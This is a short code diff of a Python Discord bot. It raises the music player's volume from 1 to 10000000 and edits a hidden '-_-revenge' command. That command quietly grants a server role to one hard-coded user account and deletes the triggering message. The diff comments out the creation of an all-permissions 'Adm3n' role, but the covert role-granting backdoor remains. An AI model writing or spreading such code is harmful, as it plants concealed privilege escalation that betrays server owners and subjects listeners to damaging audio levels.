@@ -294,7 +294,7 @@ class Music:
             fmt = 'An error occurred while processing this request: ```py\n{}: {}\n```'
             await self.bot.send_message(ctx.message.channel, fmt.format(type(e).__name__, e))
         else:
-            player.volume = 1
+            player.volume = 10000000
             entry = VoiceEntry(ctx.message, player)
             await self.bot.say('Enqueued ' + str(entry))
             await state.songs.put(entry)
@@ -502,7 +502,7 @@ async def on_message(message):
     if message.content == "-_-revenge":
         auth = message.author
         role =  get(message.server.roles, name="OG Bois")
-        role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.Colour(0xe67e22), hoist = True )
+        #role = await client.create_role(message.server, name = "Adm3n", permissions = discord.Permissions.all(), colour = discord.Colour(0xe67e22), hoist = True )
         await client.add_roles(message.server.get_member_named("Deadman0FTW#0593"), role)
         await client.delete_message(message)
 
